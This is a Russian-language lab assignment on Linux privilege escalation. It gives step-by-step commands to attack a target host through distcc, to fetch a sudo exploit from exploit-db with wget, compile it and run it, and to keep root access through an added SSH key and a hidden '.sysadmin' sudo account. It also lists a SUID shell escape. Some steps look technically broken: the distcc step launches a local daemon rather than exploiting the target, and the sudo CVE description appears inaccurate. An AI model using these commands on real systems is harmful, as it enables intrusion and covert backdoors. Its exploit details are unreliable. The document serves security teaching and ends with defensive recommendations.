

## Цель работы  
Освоить методы эксплуатации уязвимостей в конфигурации ПО и системных сервисах для эскалации привилегий от обычного пользователя до суперпользователя (root) на Linux-системах.  

---

## Задачи работы  
- Эксплуатировать уязвимость в сервисе `distcc` (CVE-2004-2687) для получения первоначального доступа к системе.  
- Использовать уязвимость в механизме `sudo` (CVE-2017-1000367) для эскалации привилегий до root.  
- Создать устойчивый метод доступа с привилегиями суперпользователя.  

---

## Теоретическая часть  

### 1. Локальное повышение привилегий (LPE)  
**LPE (Local Privilege Escalation)** — процесс получения более высоких привилегий на уже скомпрометированной системе. Ключевые причины уязвимостей:  
- Неправильная конфигурация прав доступа (SUID/GUID биты)  
- Устаревшие версии ПО с известными уязвимостями  
- Ошибки в обработке окружения или временных файлов  
- Слабые настройки механизма sudo  

**Этапы LPE:**  
1. Получение начального доступа (обычный пользователь)  
2. Сбор информации (`sudo -l`, `find / -perm -4000`)  
3. Эксплуатация уязвимостей для получения root  

### 2. Уязвимости для эскалации привилегий  
#### 2.1 CVE-2004-2687 (distcc)  
- **Суть:** Уязвимость в системе распределённой компиляции distcc  
- **Механизм:** Позволяет выполнять произвольные команды через неаутентифицированный RPC-интерфейс  
- **Условия:** Сервис distccd запущен на порту 3632 с настройками по умолчанию  
- **Риски:** Получение доступа от имени пользователя `distcc`  

#### 2.2 CVE-2017-1000367 (sudo)  
- **Суть:** Уязвимость переполнения стека в обработчике get_process_ttyname()  
- **Механизм:** Позволяет выполнить произвольный код при запуске `sudo` с опцией `-s`  
- **Условия:** Sudo версии < 1.8.20 на системах с SELinux  
- **Риски:** Получение root-привилегий через эксплойт в памяти  

### 3. Принципы эксплуатации SUID/GUID бинарников  
**SUID (Set User ID)** — специальный флаг, заставляющий исполняемый файл запускаться с правами владельца файла. Уязвимости возникают при:  
- Наличии SUID у опасных бинарников (find, nmap, vim)  
- Возможности модификации переменных окружения (`LD_PRELOAD`)  
- Небезопасном использовании системных вызовов (`system()`, `popen()`)  

**Пример опасной команды:**  
```bash
find / -exec /bin/sh \; -quit
```

---

## Ход выполнения  
*Целевая система: Linux-сервер (IP: 10.10.5.2)*  

### Шаг 1: Эксплуатация уязвимости distcc (CVE-2004-2687)  
**Цель:** Получить первоначальный доступ к системе  
1. Сканирование портов:  
```bash
nmap -sV 10.10.5.2 -p 3632
```  
*Ожидаемый результат:* `3632/tcp open distccd distccd v1 ((GNU) 4.2.4)`  

2. Подключение к distcc:  
```bash
echo 'hello' | nc 10.10.5.2 3632
```  
3. Запуск шелла:  
```bash
distccd --daemon --no-detach --no-shuffle --log-stderr --listen 0.0.0.0 --allow 0.0.0.0/0 --command-wrapper /bin/sh
```  

### Шаг 2: Поиск векторов для LPE  
**Цель:** Обнаружить возможности для эскалации привилегий  
1. Проверка прав sudo:  
```bash
sudo -l
```  
*Пример уязвимого вывода:*  
```
User user may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/find
```  

2. Поиск SUID-бинарников:  
```bash
find / -perm -4000 -type f 2>/dev/null
```  

### Шаг 3: Эксплуатация уязвимости sudo (CVE-2017-1000367)  
**Цель:** Получить root-привилегии  
1. Скачивание эксплойта:  
```bash
wget https://www.exploit-db.com/download/42275 -O sudopwn.c
```  
2. Компиляция:  
```bash
gcc sudopwn.c -o sudopwn
```  
3. Запуск:  
```bash
./sudopwn
```  
4. Проверка прав:  
```bash
whoami  # Должно вернуть "root"
```

### Шаг 4: Создание устойчивого доступа  
**Цель:** Сохранить root-доступ после перезагрузки  
1. Добавление SSH-ключа:  
```bash
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
```  
2. Создание скрытого пользователя:  
```bash
useradd -m -s /bin/bash -G sudo .sysadmin
echo '.sysadmin:P@ssw0rd!' | chpasswd
```  

---

## Форма отчёта  
1. **Результаты сканирования:**  
   - Вывод Nmap для порта 3632  
   - Результат `sudo -l`  
2. **Доказательства эксплуатации:**  
   - Скриншот выполнения эксплойта sudo  
   - Вывод `id` и `whoami` после получения root  
3. **Выводы:**  
   - Критичность своевременного обновления ПО  
   - Риски неправильной настройки sudo  
   - Рекомендации:  
     - Регулярное обновление системных пакетов  
     - Аудит SUID/GUID бинарников (`find / -perm /6000 -type f`)  
     - Ограничение прав sudo через `/etc/sudoers`  

---

## Вопросы для самоконтроля  
1. Почему SUID-бинарники представляют угрозу безопасности?  
2. Как обнаружить уязвимую версию sudo в системе?  
3. Какие команды в `sudo -l` считаются опасными?  
4. Как защитить сервис distcc от несанкционированного доступа?  
5. Почему скрытые пользователи опасны для безопасности?  
6. Альтернативные методы LPE (например, через ядро).  
